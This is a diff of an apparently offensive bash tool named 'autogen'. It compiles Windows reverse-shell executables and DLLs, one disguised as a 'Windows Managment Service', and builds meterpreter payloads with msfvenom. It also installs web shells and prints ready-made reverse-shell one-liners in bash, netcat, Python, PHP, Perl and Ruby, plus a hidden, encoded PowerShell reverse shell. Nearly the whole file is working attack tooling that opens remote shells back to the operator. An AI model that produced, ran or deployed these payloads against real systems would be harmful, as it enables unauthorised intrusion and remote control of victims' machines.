@@ -3,6 +3,7 @@
 lhost="127.0.0.1"
 lport=4444
 
+LP="\e[38;5;189m"
 G="\e[32m"
 R="\e[31m"
 BB="\e[1;34m"
@@ -11,17 +12,24 @@ LG="\e[38;5;245m"
 W="\e[0m"
 
 usage() {
-    echo "Usage:"
-    echo "-c    -> compile basic binaries"
-    echo "-m    -> compile meterpreter binaries"
-    echo "-d    -> compile all binaries but don't list"
-    echo "-w    -> set up webshells and don't list"
-    echo "-g    -> generate powershell one liners"
-    echo "-s    -> don't start python http server"
-    echo "-h    -> help menu"
+    echo "usage: autogen <options>"
     echo ""
     echo "-i [ip]    -> manually set LHOST"
     echo "-p [port]  -> manually set LPORT"
+    echo ""
+    echo "--- main options"
+    echo "-r    -> only show reverse shell one-liners and don't start http server (default: all = -rl)"
+    echo "-l    -> only show payload list (default: all = -rl)"
+    echo ""
+    echo "--- payload options"
+    echo "-c    -> compile basic binaries"
+    echo "-m    -> compile meterpreter binaries"
+    echo "-w    -> setup webshells"
+    echo "-d    -> setup all (-cmw)"
+    echo ""
+    echo "--- other"
+    echo "-s    -> don't start python http server"
+    echo "-h    -> help menu"
     exit 1;
 }
 
@@ -41,19 +49,26 @@ get_ip_address() {
 compile_payloads() {
     echo -e "\n${M}COMPILING${W}"
     echo -e "${LG}==============================================${W}"
-    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/win/src/cppdll_shell.cpp --shared -o /home/$USER/auto/payloads/win/cppdll_shell.dll -DSERVER_HOST="\"$lhost"\" -DSERVER_PORT="$lport" -DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -lws2_32
-    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/win/src/winshell.c -o /home/$USER/auto/payloads/win/winshell.exe -DSERVER_HOST="\"$lhost"\" -DSERVER_PORT="$lport" -DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -lws2_32
+    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/win/src/dllshell.cpp --shared -o /home/$USER/auto/payloads/win/dllshell.dll -DSERVER_HOST="\"$lhost"\" -DSERVER_PORT="$lport" -DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -lws2_32
+    echo -e "${G}[+]${W} dllshell.dll"
+    
+    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/win/src/winshell.c -o /home/$USER/auto/payloads/win/winshell.exe -DSERVER_HOST="\"$lhost"\" -DSERVER_PORT="$lport" -DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -lws2_32 -w
+    echo -e "${G}[+]${W} winshell.exe"
 
     x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/win/src/rs_service/main.c /home/$USER/auto/payloads/win/src/rs_service/service.c /home/$USER/auto/payloads/win/src/rs_service/shell.c -o /home/$USER/auto/payloads/win/rs_service.exe \
     -DSERVER_HOST=L"\"$lhost\"" -DSERVER_PORT=L"\"$lport\"" -DSERVICE_NAME=L"\"WinMansvc\"" -DSERVICE_DESC=L"\"Windows Managment Service\"" -DDISPLAY_NAME=L"\"WinMansvc\"" -DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -lws2_32
+    echo -e "${G}[+]${W} rs_service.exe"
 }
 
 compile_meterpreter() {
     echo -e "\n${M}Making Meterpreter Payloads${W}"
     echo -e "${LG}==============================================${W}"
     msfvenom --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /home/$USER/auto/payloads/win/mettcp.exe
+    echo -e "${G}[+]${W} windows meterpreter tcp shell | mettcp.exe\n"
     msfvenom --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f exe > /home/$USER/auto/payloads/win/methttps.exe
+    echo -e "${G}[+]${W} windows meterpreter https shell | methttps.exe\n"
     msfvenom --platform linux --arch x64 --payload linux/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > /home/$USER/auto/payloads/lin/linmettcp.elf
+    echo -e "${G}[+]${W} linux meterpreter tcp shell | linmettcp.elf\n"
 }
 
 set_webshells() {
@@ -71,37 +86,41 @@ set_webshells() {
     echo "aspx shell location -> /home/$USER/auto/payloads/web/shell.aspx"
 }
 
-list_stuff() {
+list_oneliners() {
+    host="${LP}$lhost${W}"
+    port="${LP}$lport${W}"
     echo ""
     echo -e "${BB}ONE LINERS${W}"
     echo -e "${LG}==============================================${W}"
     echo "<?php echo system(\$_GET['cmd'])?>"
     echo "<?php%20echo%20system(\$_GET['cmd'])?>"
     echo ""
-    echo "bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'"
-    echo "bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$lhost%2F$lport%200%3E%261%22"
-    echo "%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$lhost%2F$lport%200%3E%261%27%22"
+    echo -e "bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'"
+    echo -e "bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$host%2F$port%200%3E%261%22"
+    echo -e "%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$host%2F$port%200%3E%261%27%22"
     echo ""
-    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
+    echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $host $port >/tmp/f"
     echo ""
-    echo "nc -e /bin/bash $lhost $lport"
+    echo -e "nc -e /bin/bash $host $port"
     echo ""
-    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
     echo ""
-    echo "php -r \$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");"
+    echo -e "php -r \$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");"
     echo ""
-    echo "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+    echo -e "perl -e 'use Socket;\$i=\"$host\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
     echo ""
-    echo "ruby -rsocket -e'f=TCPSocket.open(\"$lhost\",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+    echo -e "ruby -rsocket -e'f=TCPSocket.open(\"$host\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
     echo ""
-    if $1; then
-        python3 /home/$USER/auto/scripts/genps_quiet.py $lhost $lport
-        echo ""
-    fi
-    if $1; then # just for testing, remove if you want
-        echo -n "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand "; pwsh -File /home/$USER/auto/scripts/create_ps_revshell.ps1 "$lhost" "$lport"
-        echo ""
-    fi
+    python3 /home/$USER/auto/scripts/genps_quiet.py $lhost $lport
+    echo ""
+
+    # just for testing, remove if you want
+    echo -n "powershell.exe%20-enc%20"; pwsh -File /home/$USER/auto/scripts/create_ps_revshell.ps1 "$lhost" "$lport"
+    echo ""
+}
+
+list_payloads()
+{
     echo ""
     echo -e "${BB}ACTIVE DIRECTORY${W}"
     echo -e "${LG}==============================================${W}"
@@ -195,26 +214,30 @@ custom_lhost=false
 compile=false
 meterpreter=false
 webshells=false
-genshells=false
 start_python=true
 compile_and_dontlist=false
+print_oneliners=false
+print_payloads=false
 
-while getopts ":cmdwgsi:p:" opt; do
+while getopts ":rlcmwdgsi:p:" opt; do
     case ${opt} in
+    r )
+        print_oneliners=true
+        ;;
+    l )
+        print_payloads=true
+        ;;
     c )
         compile=true
         ;;
     m )
         meterpreter=true
         ;;
-    d )
-        compile_and_dontlist=true
-        ;;
     w )
         webshells=true
         ;;
-    g )
-        genshells=true
+    d )
+        compile_and_dontlist=true
         ;;
     s )
         start_python=false
@@ -256,9 +279,18 @@ if $compile_and_dontlist; then
     compile_meterpreter
     set_webshells
 else
-    list_stuff $genshells
-
-    if $start_python; then
-        start_http_server
+    if $print_oneliners; then
+        list_oneliners  true
+    elif $print_payloads; then
+        list_payloads
+        if $start_python; then
+            start_http_server
+        fi
+    else
+        list_oneliners false
+        list_payloads
+        if $start_python; then
+            start_http_server
+        fi
     fi
 fi
